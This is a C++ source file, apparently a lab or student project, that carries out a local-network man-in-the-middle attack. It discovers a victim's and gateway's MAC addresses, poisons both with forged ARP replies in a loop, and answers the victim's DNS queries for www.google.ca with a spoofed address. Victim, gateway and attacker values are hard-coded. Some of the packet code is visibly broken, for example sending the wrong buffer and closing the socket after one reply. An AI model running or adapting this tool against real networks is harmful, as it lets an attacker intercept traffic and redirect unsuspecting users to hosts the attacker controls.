#include <iostream>
#include <unordered_map>
#include <vector>

#include <stdio.h>
#include <string.h>
#include <unistd.h>

#include "NetworkEngine.h"
#include "UdpStack.h"

#include "checksum.h"
#include "dns.h"

void fillIpUdpHeader(unsigned char *buffer, const struct in_addr &src, const struct in_addr &dst,
                     const unsigned short sport, const unsigned short dport,
                     const unsigned char *payload, const int payloadSize);
void dnsSpoof(NetworkEngine *net);
void dnsGotPacket(unsigned char *args, const struct pcap_pkthdr *header,
                  const unsigned char *packet);

struct in_addr victimIp;  // get this from config file
struct in_addr gatewayIp; // get this from config file

int rawSocket;

// get the interface name, ip of gateway and ip of victim
// main program we need: interface name, ip of gateway, ip of victim
// dns poison we need: domain to poison, what to poison too
int main(int argc, const char *argv[]) {
    const char *interfaceName = "eno1";                           // get this from config file
    std::unordered_map<std::string, std::string> domainsToPoison; // get this from config file

    unsigned char attackerMac[ETH_ALEN] = {0xe4, 0xb9, 0x7a,
                                           0xee, 0x8d, 0xa5}; // get this from config file
    unsigned char victimMac[ETH_ALEN];                        // get this from arp request
    unsigned char gatewayMac[ETH_ALEN];                       // get this from arp request

    struct arp_header victimArp;
    struct arp_header gatewayArp;
    struct arp_header arpRequestVictim;
    struct arp_header arpRequestGateway;

    victimIp.s_addr = 0x1400a8c0;
    gatewayIp.s_addr = 0x6400a8c0;

    // prepare the mac variables
    memset(victimMac, 0, ETH_ALEN);
    memset(gatewayMac, 0, ETH_ALEN);

    bool victimMacSet = false;
    bool gatewayMacSet = false;
    NetworkEngine ipEngine(interfaceName);

    // start arp sniffing
    ipEngine.LoopCallbacks.clear();
    ipEngine.LoopCallbacks.push_back(
        [&](const struct pcap_pkthdr *header, const unsigned char *packet) {
            struct arp_header *arp = (struct arp_header *)(packet + 14);

            if (ntohs(arp->arp_hd) == ARPHRD_ETHER && ntohs(arp->arp_pr) == ETH_P_IP) {
                struct in_addr *tmp = (struct in_addr *)arp->arp_spa;
                if (tmp->s_addr == victimIp.s_addr) {
                    for (int i = 0; i < ETH_ALEN; i++) {
                        victimMac[i] = arp->arp_sha[i];
                    }
                    victimMacSet = true;
                    std::cout << "victim mac acquired" << std::endl;
                }

                if (tmp->s_addr == gatewayIp.s_addr) {
                    for (int i = 0; i < ETH_ALEN; i++) {
                        gatewayMac[i] = arp->arp_sha[i];
                    }
                    gatewayMacSet = true;
                    std::cout << "gateway mac acquired" << std::endl;
                }
            }
        });
    std::cout << "starting arp sniff" << std::endl;
    ipEngine.startSniff("arp");
    std::cout << "arp sniff started" << std::endl;

    craftArpRequest(&victimIp, ipEngine.getIp(), ipEngine.getMac(), &arpRequestVictim);
    craftArpRequest(&gatewayIp, ipEngine.getIp(), ipEngine.getMac(), &arpRequestGateway);

    // stop sniffing for macs once they have been found
    while (true) {
        if (!victimMacSet) {
            // send arp request to get mac address of victim
            std::cout << "requesting victim mac" << std::endl;
            ipEngine.sendArp(arpRequestVictim);
        }

        if (!gatewayMacSet) {
            // send arp request to get the mac address of gateway
            std::cout << "requesting gateway mac" << std::endl;
            ipEngine.sendArp(arpRequestGateway);
        }

        if (victimMacSet && gatewayMacSet) {
            std::cout << "stopping arp sniff" << std::endl;
            ipEngine.stopSniff();
            std::cout << "arp sniff has stopped" << std::endl;
            break;
        }

        sleep(5);
    }

    // start dns sniffing
    std::cout << "starting dns sniff" << std::endl;
    rawSocket = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    std::thread dnsThread(dnsSpoof, &ipEngine);
    std::cout << "dns sniffing started" << std::endl;

    // start arp poisoning
    forgeArp(attackerMac, &gatewayIp, victimMac, &victimIp, &victimArp);
    forgeArp(attackerMac, &victimIp, gatewayMac, &gatewayIp, &gatewayArp);

    while (true) {
        ipEngine.sendArp(victimArp);
        ipEngine.sendArp(gatewayArp);
        sleep(5);
    }

    dnsThread.join();
    return 0;
}

void fillIpUdpHeader(unsigned char *buffer, const struct in_addr &src, const struct in_addr &dst,
                     const unsigned short sport, const unsigned short dport,
                     const unsigned char *payload, const int payloadSize) {
    struct iphdr *ipBuffer = (struct iphdr *)buffer;
    struct udphdr *udpBuffer = (struct udphdr *)(buffer + 20);
    ipBuffer->ihl = 5;
    ipBuffer->version = 4;
    ipBuffer->tos = 0;
    ipBuffer->id = (int)(244.0 * rand() / (RAND_MAX + 1.0));
    ipBuffer->frag_off = 0;
    ipBuffer->ttl = 64;
    ipBuffer->protocol = IPPROTO_UDP;
    ipBuffer->check = 0;
    ipBuffer->saddr = htonl(src.s_addr);
    ipBuffer->daddr = htonl(dst.s_addr);
    ipBuffer->check = in_cksum((unsigned short *)ipBuffer, 20);
    udpBuffer->source = htons(sport);
    udpBuffer->dest = htons(dport);
    udpBuffer->len = htons(8 + payloadSize);
    struct UdpPseudoHeader pseudo_header;
    pseudo_header.srcAddr = ipBuffer->saddr;
    pseudo_header.dstAddr = ipBuffer->daddr;
    pseudo_header.placeholder = 0;
    pseudo_header.protocol = IPPROTO_UDP;
    pseudo_header.udpLen = htons(udpBuffer->len);
    memcpy((char *)&pseudo_header.udp, (char *)udpBuffer, 8);
    short totalLen = 20 + 8 + payloadSize;
    ipBuffer->tot_len = htons(totalLen);
    memcpy(buffer + 20 + 8, payload, payloadSize);
}

void dnsSpoof(NetworkEngine *net) {
    int i;

    pcap_t *session;
    pcap_if_t *allDevs;
    pcap_if_t *temp;

    struct bpf_program filterProgram;
    bpf_u_int32 netAddr = 0;

    char errBuff[PCAP_ERRBUF_SIZE];

    if (pcap_findalldevs(&allDevs, errBuff) == -1) {
        std::cerr << "pcap_findallDevs: " << errBuff << std::endl;
        return;
    }

    for (i = 0, temp = allDevs; temp; temp = temp->next, ++i) {
        if (!(temp->flags & PCAP_IF_LOOPBACK)) {
            break;
        }
    }

    session = pcap_open_live(temp->name, BUFSIZ, 0, 1, errBuff);
    if (!session) {
        std::cerr << "Could not open device: " << errBuff << std::endl;
        return;
    }

    if (pcap_compile(session, &filterProgram, "udp and dst port domain", 0, netAddr)) {
        std::cerr << "Error calling pcap_compile" << std::endl;
        return;
    }

    if (pcap_setfilter(session, &filterProgram) == -1) {
        std::cerr << "Error setting filter" << std::endl;
        return;
    }

    pcap_loop(session, 0, &dnsGotPacket, (unsigned char *)net);

    pcap_freealldevs(allDevs);
}

void dnsGotPacket(unsigned char *args, const struct pcap_pkthdr *header,
                  const unsigned char *packet) {
    // tmp fake spoofing address
    struct in_addr spoofIp;
    spoofIp.s_addr = 0x1300a8c0;

    unsigned char addressFilter[] = {0x03, 0x77, 0x77, 0x77, 0x06, 0x67, 0x6f, 0x6f,
                                     0x67, 0x6c, 0x65, 0x02, 0x63, 0x61, 0x00};

    unsigned char buffer[1500];
    unsigned char frame[1500];
    struct iphdr *ip;
    struct udphdr *udp;
    dnshdr *dns;

    int ipLen = 0;

    // get ip hdr size
    ip = (iphdr *)(packet + 14);
    ipLen = ip->ihl * 4;

    // get udp hdr and size
    udp = (udphdr *)(packet + 14 + ipLen);

    // get dns header
    dns = (dnshdr *)(packet + 14 + ipLen + UdpStack::UDP_HDR_LEN);

    if (dns->qr == 1) {
        return;
    }

    std::cout << "got query" << std::endl;

    if (ip->saddr != victimIp.s_addr) {
        return;
    }

    std::cout << "query from target host" << std::endl;

    unsigned char *query = (unsigned char *)(packet + 14 + 20 + 8 + 12);
    for (int i = 0; addressFilter[i]; i++) {
        if (addressFilter[i] != query[i]) {
            std::cout << "query not for site we care about" << std::endl;
            return;
        }
    }

    // craft the poisoned response
    memset(buffer, 0, 1500);
    int responseSize = forgeDns(dns, &spoofIp, buffer + 20 + 8);
    std::cout << "craft a response with size: " << responseSize << std::endl;

    // reply
    memset(frame, 0, 1500);
    struct in_addr ogSrc;
    struct in_addr ogDst;
    ogSrc.s_addr = ntohl(ip->saddr);
    ogDst.s_addr = ntohl(ip->daddr);
    fillIpUdpHeader(frame, ogDst, ogSrc, ntohs(udp->dest), ntohs(udp->source),
                    buffer, responseSize);

    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = udp->dest;
    sin.sin_addr.s_addr = ip->saddr;
    int bytesSent = sendto(rawSocket, buffer, 20 + 8 + responseSize, 0, (struct sockaddr *)&sin, sizeof(sin));
    std::cout << "sending reply, size: " << bytesSent << std::endl;

    close(rawSocket);
}
